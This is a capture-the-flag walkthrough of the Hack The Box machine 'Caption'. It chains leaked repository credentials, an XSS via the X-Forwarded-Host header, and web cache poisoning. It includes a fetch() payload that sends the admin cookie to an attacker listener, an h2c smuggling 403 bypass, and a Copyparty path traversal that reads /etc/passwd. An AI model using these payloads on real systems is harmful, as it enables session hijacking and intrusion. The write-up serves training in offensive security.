---
layout: writeup
category: HTB
date: 2024-12-29
comments: false
tags: gitbucket codereview informationleakage apachethrift wfuzz cache varnish haproxy xss crosssitescripting sessionhijacking webcachepoisoning
---

<br />

![1](../../../assets/images/Caption/1.png)

<br />

OS -> Linux.

Difficulty -> Hard.

<br />

# Introduction.

<br />



<br />

# Enumeration.

<br />

We begin with a standard `nmap` scan to identify open ports:

<br />

```bash
❯ nmap -p- 10.10.11.33 --open --min-rate 5000 -sS -T5 -Pn -n -sCV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-30 11:26 CEST
Nmap scan report for 10.10.11.33
Host is up (0.042s latency).
Not shown: 65481 closed tcp ports (reset), 51 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http
|_http-title: Did not follow redirect to http://caption.htb
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, X11Probe: 
|     HTTP/1.1 400 Bad request
|     Content-length: 90
|     Cache-Control: no-cache
|     Connection: close
|     Content-Type: text/html
|     <html><body><h1>400 Bad request</h1>
|     Your browser sent an invalid request.
|     </body></html>
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.1 301 Moved Permanently
|     content-length: 0
|     location: http://caption.htb
|_    connection: close
8080/tcp open  http-proxy
|_http-title: GitBucket
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Mon, 30 Jun 2025 09:26:01 GMT
|     Set-Cookie: JSESSIONID=node0mrmflj29qv1x1fb73scwwnycp4.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 5916
|     <!DOCTYPE html>
|     <html prefix="og: http://ogp.me/ns#" lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <title>Error</title>
|     <meta property="og:title" content="Error" />
|     <meta property="og:type" content="object" />
|     <meta property="og:url" content="http://10.10.11.33:8080/nice%20ports%2C/Tri%6Eity.txt%2ebak" />
|     <meta property="og:image" content="http://10.10.11.33:8080/assets/common/images/gitbucket_ogp.png" />
|     <link rel="icon" href="/assets/common/images/gi
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Mon, 30 Jun 2025 09:26:01 GMT
|     Set-Cookie: JSESSIONID=node01s5sz94d5atb2778ruxss898c2.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 8628
|     <!DOCTYPE html>
|     <html prefix="og: http://ogp.me/ns#" lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <title>GitBucket</title>
|     <meta property="og:title" content="GitBucket" />
|     <meta property="og:type" content="object" />
|     <meta property="og:url" content="http://10.10.11.33:8080/" />
|     <meta property="og:image" content="http://10.10.11.33:8080/assets/common/images/gitbucket_ogp.png" />
|     <link rel="icon" href="/assets/common/images/gitbucket.png?20250630092430" type="
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Mon, 30 Jun 2025 09:26:01 GMT
|     Set-Cookie: JSESSIONID=node01jdrq8a4kds2e1ofe86ytscj3l3.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Allow: GET,HEAD,POST,OPTIONS
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 505 HTTP Version Not Supported
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|_    <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.94SVN%I=7%D=6/30%Time=6862585C%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,66,"HTTP/1\.1\x20301\x20Moved\x20Permanently\r\ncontent-lengt
SF:h:\x200\r\nlocation:\x20http://caption\.htb\r\nconnection:\x20close\r\n
SF:\r\n")%r(HTTPOptions,66,"HTTP/1\.1\x20301\x20Moved\x20Permanently\r\nco
SF:ntent-length:\x200\r\nlocation:\x20http://caption\.htb\r\nconnection:\x
SF:20close\r\n\r\n")%r(RTSPRequest,CF,"HTTP/1\.1\x20400\x20Bad\x20request\
SF:r\nContent-length:\x2090\r\nCache-Control:\x20no-cache\r\nConnection:\x
SF:20close\r\nContent-Type:\x20text/html\r\n\r\n<html><body><h1>400\x20Bad
SF:\x20request</h1>\nYour\x20browser\x20sent\x20an\x20invalid\x20request\.
SF:\n</body></html>\n")%r(X11Probe,CF,"HTTP/1\.1\x20400\x20Bad\x20request\
SF:r\nContent-length:\x2090\r\nCache-Control:\x20no-cache\r\nConnection:\x
SF:20close\r\nContent-Type:\x20text/html\r\n\r\n<html><body><h1>400\x20Bad
SF:\x20request</h1>\nYour\x20browser\x20sent\x20an\x20invalid\x20request\.
SF:\n</body></html>\n")%r(FourOhFourRequest,66,"HTTP/1\.1\x20301\x20Moved\
SF:x20Permanently\r\ncontent-length:\x200\r\nlocation:\x20http://caption\.
SF:htb\r\nconnection:\x20close\r\n\r\n")%r(RPCCheck,CF,"HTTP/1\.1\x20400\x
SF:20Bad\x20request\r\nContent-length:\x2090\r\nCache-Control:\x20no-cache
SF:\r\nConnection:\x20close\r\nContent-Type:\x20text/html\r\n\r\n<html><bo
SF:dy><h1>400\x20Bad\x20request</h1>\nYour\x20browser\x20sent\x20an\x20inv
SF:alid\x20request\.\n</body></html>\n")%r(DNSVersionBindReqTCP,CF,"HTTP/1
SF:\.1\x20400\x20Bad\x20request\r\nContent-length:\x2090\r\nCache-Control:
SF:\x20no-cache\r\nConnection:\x20close\r\nContent-Type:\x20text/html\r\n\
SF:r\n<html><body><h1>400\x20Bad\x20request</h1>\nYour\x20browser\x20sent\
SF:x20an\x20invalid\x20request\.\n</body></html>\n")%r(DNSStatusRequestTCP
SF:,CF,"HTTP/1\.1\x20400\x20Bad\x20request\r\nContent-length:\x2090\r\nCac
SF:he-Control:\x20no-cache\r\nConnection:\x20close\r\nContent-Type:\x20tex
SF:t/html\r\n\r\n<html><body><h1>400\x20Bad\x20request</h1>\nYour\x20brows
SF:er\x20sent\x20an\x20invalid\x20request\.\n</body></html>\n")%r(Help,CF,
SF:"HTTP/1\.1\x20400\x20Bad\x20request\r\nContent-length:\x2090\r\nCache-C
SF:ontrol:\x20no-cache\r\nConnection:\x20close\r\nContent-Type:\x20text/ht
SF:ml\r\n\r\n<html><body><h1>400\x20Bad\x20request</h1>\nYour\x20browser\x
SF:20sent\x20an\x20invalid\x20request\.\n</body></html>\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8080-TCP:V=7.94SVN%I=7%D=6/30%Time=6862585C%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,22A1,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2030\x20Jun\
SF:x202025\x2009:26:01\x20GMT\r\nSet-Cookie:\x20JSESSIONID=node01s5sz94d5a
SF:tb2778ruxss898c2\.node0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu,\x20
SF:01\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type:\x20text/html;char
SF:set=utf-8\r\nContent-Length:\x208628\r\n\r\n<!DOCTYPE\x20html>\n<html\x
SF:20prefix=\"og:\x20http://ogp\.me/ns#\"\x20lang=\"en\">\n\x20\x20<head>\
SF:n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\"\x20/>\n\x20\x20\x20\x20<met
SF:a\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-scal
SF:e=1\.0,\x20maximum-scale=5\.0\"\x20/>\n\x20\x20\x20\x20<meta\x20http-eq
SF:uiv=\"X-UA-Compatible\"\x20content=\"IE=edge\"\x20/>\n\x20\x20\x20\x20<
SF:title>GitBucket</title>\n\x20\x20\x20\x20<meta\x20property=\"og:title\"
SF:\x20content=\"GitBucket\"\x20/>\n\x20\x20\x20\x20<meta\x20property=\"og
SF::type\"\x20content=\"object\"\x20/>\n\x20\x20\x20\x20<meta\x20property=
SF:\"og:url\"\x20content=\"http://10\.10\.11\.33:8080/\"\x20/>\n\x20\x20\x
SF:20\x20\n\x20\x20\x20\x20\x20\x20<meta\x20property=\"og:image\"\x20conte
SF:nt=\"http://10\.10\.11\.33:8080/assets/common/images/gitbucket_ogp\.png
SF:\"\x20/>\n\x20\x20\x20\x20\n\x20\x20\x20\x20\n\x20\x20\x20\x20<link\x20
SF:rel=\"icon\"\x20href=\"/assets/common/images/gitbucket\.png\?2025063009
SF:2430\"\x20type=\"")%r(HTTPOptions,109,"HTTP/1\.1\x20200\x20OK\r\nDate:\
SF:x20Mon,\x2030\x20Jun\x202025\x2009:26:01\x20GMT\r\nSet-Cookie:\x20JSESS
SF:IONID=node01jdrq8a4kds2e1ofe86ytscj3l3\.node0;\x20Path=/;\x20HttpOnly\r
SF:\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-T
SF:ype:\x20text/html;charset=utf-8\r\nAllow:\x20GET,HEAD,POST,OPTIONS\r\nC
SF:ontent-Length:\x200\r\n\r\n")%r(RTSPRequest,B8,"HTTP/1\.1\x20505\x20HTT
SF:P\x20Version\x20Not\x20Supported\r\nContent-Type:\x20text/html;charset=
SF:iso-8859-1\r\nContent-Length:\x2058\r\nConnection:\x20close\r\n\r\n<h1>
SF:Bad\x20Message\x20505</h1><pre>reason:\x20Unknown\x20Version</pre>")%r(
SF:FourOhFourRequest,1810,"HTTP/1\.1\x20404\x20Not\x20Found\r\nDate:\x20Mo
SF:n,\x2030\x20Jun\x202025\x2009:26:01\x20GMT\r\nSet-Cookie:\x20JSESSIONID
SF:=node0mrmflj29qv1x1fb73scwwnycp4\.node0;\x20Path=/;\x20HttpOnly\r\nExpi
SF:res:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type:\x
SF:20text/html;charset=utf-8\r\nCont
```

<br />

Open Ports:

`Port 22` -> ssh 

`Port 80` -> http 

`Port 8080` -> http

<br />

# Http Enumeration: -> Port 80 

<br />

When we try to load the website, it redirects to `http://caption.htb`.

So we proceed to add this domain to our `/etc/hosts`:

<br />

```bash
10.10.11.33 caption.htb
```

<br />

This website shows a login page:

<br />

![2](../../../assets/images/Caption/2.png)

<br />

We try default credentials and some basic SQL Injection payloads `(' or 1=1-- -')`, but without success.

<br />

## Tech Stack.

<br />

From the server response, we can gather some technology information:

<br />

```bash
HTTP/1.1 200 OK
server: Werkzeug/3.0.1 Python/3.10.12
date: Mon, 16 Sep 2024 21:31:47 GMT
content-type: text/html; charset=utf-8
content-length: 4412
x-varnish: 32784
age: 0
via: 1.1 varnish (Varnish/6.6)
x-cache: MISS
accept-ranges: bytes
```

<br />

As we can see, we're dealing with a `Werkzeug 3.0.1`, so it seems that the application backend is written in Python.

Some other interesting headers are:

- `x-varnish`:  Header added because a Varnish cache server is present (website booster).

- `age`: Time elapsed since the resource was last cached.

- `via`: Indicates that the response has been processed by a Varnish cache server.

- `x-cache: MISS`: The requested resource was not present in the cache and had to be retrieved from the backend server.

<br />

## Fuzzing.

<br />

We continue the enumeration by applying path fuzzing over the domain with `Wfuzz`:

<br />

```bash
❯ wfuzz -c -t 50 --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://caption.htb/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://caption.htb/FUZZ
Total requests: 220565

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

...[snip]...
000000043:   302        5 L      22 W       189 Ch      "home"
000000017:   403        4 L      8 W        94 Ch       "download"                                                                                                            
000002276:   403        4 L      8 W        94 Ch       "logs"                                                                                                                
000001312:   302        5 L      22 W       189 Ch      "firewalls"                                                                                                           
000001230:   302        5 L      22 W       189 Ch      "logout" 
```

<br />

There are some juicy endpoints in the output:

- `/home`: 302 redirect -> Typical home page path.

- `/firewalls`: 302 redirect ->  Uncommon path that might disclose information about the application's purpose.

- `/logout`: 302 redirect. -> Typical logout path.

- `/download`: 403 forbidden -> Private endpoint that can be related to file downloads.

- `/logs`: 403 forbidden -> Restricted but interesting endpoint.

All 302 redirects (such as /firewalls) point to the login page, suggesting that authentication is required.

<br />

# Http Enumeration: -> Port 8080

<br />

The service on port 8080 is a `GitBucket` instance.

<br />

![3](../../../assets/images/Caption/3.png)

<br />

As we can see, there are two public repositories.

Apparently, the `Caption-Portal` is related to the login page.

Let's analyze it: 

<br />

![4](../../../assets/images/Caption/4.png)

<br />

The repository includes two folders and the famous `README.md` file.

The `/app` folder contains the `index.html` of the login page and a `/static/css` directory. At first glance, no hardcoded secrets, comments, or JS references were found.

<br />

![5](../../../assets/images/Caption/5.png)

<br />

On the other hand, the `/config` folder has several directories:

<br />

![7](../../../assets/images/Caption/7.png)

<br />

These directories contain the configurations for `HAProxy` and `Varnish`.

There are eleven commits in the commit history:

<br />

![6](../../../assets/images/Caption/6.png)

<br />

The commit `"Add frontend and backend config"` caught my attention.

Inside, we can see a changed file `haproxy.cfg` with something relevant:

<br />

![8](../../../assets/images/Caption/8.png)

<br />

We have credentials. `margo:vFr&cS2#0!`

<br />

## Login Successful as Margo.

<br /> 

Using these credentials, we successfully log into the `Caption Portal`:

<br />

![9](../../../assets/images/Caption/9.png)

<br />

After logging in, we gain access to the following functionalities:

<br />

### 1.- Firewalls:

This feature matches the `/firewalls` path discovered during fuzzing:

<br />

![10](../../../assets/images/Caption/10.png)

<br />

The page informs us that the service is under admin maintenance.

This information can be very important, because we already know that there are admins visiting this endpoint. So, if we discover any vulnerability like a `XSS` (Cross-Site Scripting), we can attempt to `steal` the admin's session cookie

<br />

### 2.- Routers:

This feature appears to be static and `non-functional`.

<br />

### 3.- Logs:

This function redirects to the `/logs` path with a `403 Forbidden`.

This suggests that the current user `(margo)` lacks sufficient privileges, possibly requiring admin access.

<br />

![11](../../../assets/images/Caption/11.png)

<br />

### 4.- Download:

<br />

This endpoint is not linked in the interface, but we had already found it during fuzzing.

It behaves the same as `/logs`, returning a 403 Forbidden.

<br />

# XSS (Cross-Site Scripting).

## X-Forwarded-Host Injection.

<br />

Now, we open `Burp Suite` to further analyze the application and intercept a request to the `/home` endpoint:

<br />

![12](../../../assets/images/Caption/12.png)

<br />

Analyzing the server response, we can see an interesting piece of code:

<br />

```bash
<script src="http://caption.htb/static/js/lib.js?utm_source=http://internal-proxy.local"></script>
```

<br />

The website makes a request to `/static/js/lib.js`, passing the `utm_source` parameter with the value `http://internal-proxy.local`

The next step is to discover where the website is looking for the `utm_source` value. 

There are several possibilities, but trying to control this value with a header like `X-Forwarded-Host` makes more sense to me.

So let's try to add the `X-Forwarded-Host: test` header to our request:

<br />

![13](../../../assets/images/Caption/13.png)

<br />

The input was successfully reflected in the response!

This opens the door to a lot of vulnerabilities, the most obvious being `XSS`, because we're injecting our input into `HTML` tags.

If we manage to break out of these tags, we can execute `JavaScript` code.

To test this, we will use the following payload:

<br />

```bash
"></script><script src="http://10.10.14.13/"><"
```

![14](../../../assets/images/Caption/14.png)

<br />

We forward the request and check our listener:

<br />

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.14.13 - - [30/Jun/2025 19:01:10] "GET / HTTP/1.1" 200 -
10.10.14.13 - - [30/Jun/2025 19:01:11] "GET / HTTP/1.1" 200 -
10.10.14.13 - - [30/Jun/2025 19:01:11] "GET / HTTP/1.1" 200 -
```

<br />

Perfect! We received our requests!

<br />

# Web Cache Poison.

## Admin Session Hijacking.

<br />

At this point, we have a `XSS` in the website, but the `/home` path is not a meaningful target for exploitation. We need to find another endpoint where the response is cached, so our payload can be cached by the server and served to a privileged user like the admin.

If an admin loads the cached payload, we can `hijack` their session by executing malicious `JavaScript` code.

As we had seen before, the `/firewalls` endpoint is under admin maintenance, so it can be a good place to exploit this:

<br />

![15](../../../assets/images/Caption/15.png)

<br />

In the response we see indicators confirming that the resource is being cached with a `max_age` of 120.

This indicates the response is cached for `120 seconds` by the server.

To exfiltrate the admin's `session` cookie, we use the following payload:

<br />

```bash
"></script><script>fetch("http://10.10.14.13/?cookies="+document.cookie);</script><"
```
![16](../../../assets/images/Caption/16.png)

<br />


After some seconds, we check our listener and...

<br />

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.33 - - [30/Jun/2025 19:37:25] "GET /?cookies=session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzUxMzA4NTczfQ.FIHkJ0o7wwVrbAAsFdBMutwRkUBxtFgnzOIvDmgU5FE HTTP/1.1" 200 -
10.10.11.33 - - [30/Jun/2025 19:37:26] "GET /?cookies=session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzUxMzA4NTczfQ.FIHkJ0o7wwVrbAAsFdBMutwRkUBxtFgnzOIvDmgU5FE HTTP/1.1" 200 -
10.10.11.33 - - [30/Jun/2025 19:37:26] "GET /?cookies=session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzUxMzA4NTczfQ.FIHkJ0o7wwVrbAAsFdBMutwRkUBxtFgnzOIvDmgU5FE HTTP/1.1" 200 -
```

<br />

We successfully retrieved the admin's session token.

To validate this session, we set it using the browser `DevTools`:

<br />

![17](../../../assets/images/Caption/16.png)

<br />

And access the `/home` page:

<br />

![17](../../../assets/images/Caption/17.png)

<br />

We're in, but if we try to access `/logs` or `/download`, the status code continues to be 403 Forbidden.

The `/firewalls` endpoint has the same content.

## Smuggling Attack:

<br />

Searching for ways to bypass a 403 forbidden in the context of `HAProxy`, we found one great [POC](https://bishopfox.com/tools/h2c-smuggling) written by `BigShopFox` that explains how we can bypass a forbidden using the `UPGRADE` HTTP  header.

To simplify the exploitation of this vulnerability, we will use the following [GitHub Repository](https://github.com/BishopFox/h2csmuggler).

First step, is to verify if our target is vulnerable. We can do it running this oneliner:

<br />

```bash
❯ python3 h2csmuggler.py -x http://caption.htb --test
[INFO] h2c stream established successfully.
[INFO] Success! http://caption.htb can be used for tunneling
```

<br />

The target is vulnerable. 

Next, we're going to read the `logs` directory via this technique:

- NOTE: Important to include the admin cookies in our onliner.

<br />

```bash
❯ python3 h2csmuggler.py -x http://caption.htb http://caption.htb/logs -H "Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzUxMzE1MjgxfQ.mvCRs4piEnvcTrPfVV8aCrDrQBw2yNLyZPco8eXzNoc"
...[snip]...
  <header class="container my-4">
    <div class="row">
      <!-- vai ocupar todo o espaço se a tela for pequena -->
      <!-- col-lg-6 para telas grandes -->
      
        <center><h1>Log Management</h1></center>
        <br/><br/><center>
        <ul>
            <li><a href="/download?url=http://127.0.0.1:3923/ssh_logs">SSH Logs</a></li>
            <li><a href="/download?url=http://127.0.0.1:3923/fw_logs">Firewall Logs</a></li>
            <li><a href="/download?url=http://127.0.0.1:3923/zk_logs">Zookeeper Logs</a></li>
            <li><a href="/download?url=http://127.0.0.1:3923/hadoop_logs">Hadoop Logs</a></li>
        </ul></center>
      </div>
    </div>
  </header>
...[snip]...
```

<br />

There are three urls related to the `/download` endpoint poiting to log files.

We can use the bypass technique to access them but we don't found nothing relevant.

Another useful step is to enumerate the `root` parth of this `internal` service:

<br />

```bash
❯ python3 h2csmuggler.py -x http://caption.htb 'http://caption.htb/download?url=http://localhost:3923/' -H "Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzUxMzE1MjgxfQ.mvCRs4piEnvcTrPfVV8aCrDrQBw2yNLyZPco8eXzNoc"
...[snip]...
		document.documentElement.className = localStorage.theme || dtheme;
	</script>
	<script src="/.cpr/util.js?_=YrpB"></script>
	<script src="/.cpr/baguettebox.js?_=YrpB"></script>
	<script src="/.cpr/browser.js?_=YrpB"></script>
	<script src="/.cpr/up2k.js?_=YrpB"></script>
</body>

</html>
```

<br />

The important information is at the end of the output.

<br />

## Copyparty 1.8.2 LFI (Local File Inclusion):

<br />

There is a strange directory in the `<script src>` tags called `.cpr`. If we make some researching, we will find that this is a common path in the `Copyparty` application with a very famous vulnerability in its `1.8.2` version.

We can find more information of this CVE in [exploit-db](https://www.exploit-db.com/exploits/51636).

<br />

```bash
# Exploit Title: copyparty 1.8.2 - Directory Traversal
# Date: 14/07/2023
# Exploit Author: Vartamtzidis Theodoros (@TheHackyDog)
# Vendor Homepage: https://github.com/9001/copyparty/
# Software Link: https://github.com/9001/copyparty/releases/tag/v1.8.2
# Version: <=1.8.2
# Tested on: Debian Linux
# CVE : CVE-2023-37474




#Description
Copyparty is a portable file server. Versions prior to 1.8.2 are subject to a path traversal vulnerability detected in the `.cpr` subfolder. The Path Traversal attack technique allows an attacker access to files, directories, and commands that reside outside the web document root directory.

#POC
curl -i -s -k -X  GET 'http://127.0.0.1:3923/.cpr/%2Fetc%2Fpasswd'
```

<br />

With the exploit source code we can confirm the port `39323`.

If reply this exploitation with our target, it doesn't work:

<br />

```bash
❯ python3 h2csmuggler.py -x http://caption.htb 'http://caption.htb/download?url=http://localhost:3923/.cpr/%2Fetc%2Fpasswd' -H "Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzUxMzE1MjgxfQ.mvCRs4piEnvcTrPfVV8aCrDrQBw2yNLyZPco8eXzNoc"
...[snip]...
[INFO] Requesting - /download?url=http://localhost:3923/.cpr/%2Fetc%2Fpasswd
:status: 200
server: Werkzeug/3.0.1 Python/3.10.12
date: Mon, 30 Jun 2025 20:02:57 GMT
content-type: text/html; charset=utf-8
content-length: 1898
x-varnish: 131170
age: 0
via: 1.1 varnish (Varnish/6.6)
x-cache: MISS
accept-ranges: bytes

<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="utf-8">
	<title>copyparty</title>
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=0.8">
	<meta name="theme-color" content="#333">

	<link rel="stylesheet" media="screen" href="/.cpr/splash.css?_=YrpB">
	<link rel="stylesheet" media="screen" href="/.cpr/ui.css?_=YrpB">
</head>

<body>
	<div id="wrap">
		<a id="a" href="/?h" class="af">refresh</a>
		<a id="v" href="/?hc" class="af">connect</a>
			<p id="b">howdy stranger &nbsp; <small>(you're not logged in)</small></p>
		<div id="msg">
			<h1 id="n">404 not found &nbsp;┐( ´ -`)┌</h1><p><a id="r" href="/?h">go home</a></p>
		</div>

		<h1 id="cc">client config:</h1>
		<ul>
			
			<li><a id="i" href="/?k304=y" class="r">enable k304</a> (currently disabled)
			
			<blockquote id="j">enabling this will disconnect your client on every HTTP 304, which can prevent some buggy proxies from getting stuck (suddenly not loading pages), <em>but</em> it will also make things slower in general</blockquote></li>
			
			<li><a id="k" href="/?reset" class="r" onclick="localStorage.clear();return true">reset client settings</a></li>
		</ul>

		<h1 id="l">login for more:</h1>
		<div>
			<form method="post" enctype="multipart/form-data" action="/.cpr/etc/passwd">
				<input type="hidden" name="act" value="login" />
				<input type="password" name="cppwd" />
				<input type="submit" value="Login" />
				
			</form>
		</div>
	</div>
	<a href="#" id="repl">π</a>
	<span id="pb"><span>powered by</span> <a href="https://github.com/9001/copyparty">copyparty </a></span>
	<script>

var SR = "",
	lang="eng",
	dfavico="🎉 000 none";

document.documentElement.className=localStorage.theme||"az a z";

</script>
<script src="/.cpr/util.js?_=YrpB"></script>
<script src="/.cpr/splash.js?_=YrpB"></script>
</body>
</html>
```

<br />

This happen because our request is going through multiple proxies and we need to URL-Encode more than one time. 

To solve this, we only need to doble url-encoding the `%` symbols adding a `%25`.

<br />

```bash
❯ python3 h2csmuggler.py -x http://caption.htb 'http://caption.htb/download?url=http://localhost:3923/.cpr/%252Fetc%252Fpasswd' -H "Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzUxMzE1MjgxfQ.mvCRs4piEnvcTrPfVV8aCrDrQBw2yNLyZPco8eXzNoc"
...[snip]...
[INFO] Requesting - /download?url=http://localhost:3923/.cpr/%252Fetc%252Fpasswd
:status: 200
server: Werkzeug/3.0.1 Python/3.10.12
date: Mon, 30 Jun 2025 20:06:50 GMT
content-type: text/html; charset=utf-8
content-length: 2122
x-varnish: 294955
age: 0
via: 1.1 varnish (Varnish/6.6)
x-cache: MISS
accept-ranges: bytes

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
haproxy:x:114:120::/var/lib/haproxy:/usr/sbin/nologin
varnish:x:115:121::/nonexistent:/usr/sbin/nologin
vcache:x:116:121::/nonexistent:/usr/sbin/nologin
varnishlog:x:117:121::/nonexistent:/usr/sbin/nologin
margo:x:1000:1000:,,,:/home/margo:/bin/bash
ruth:x:1001:1001:,,,:/home/ruth:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

<br />

We successfully retrieved the `/etc/passwd` from the victime machine.
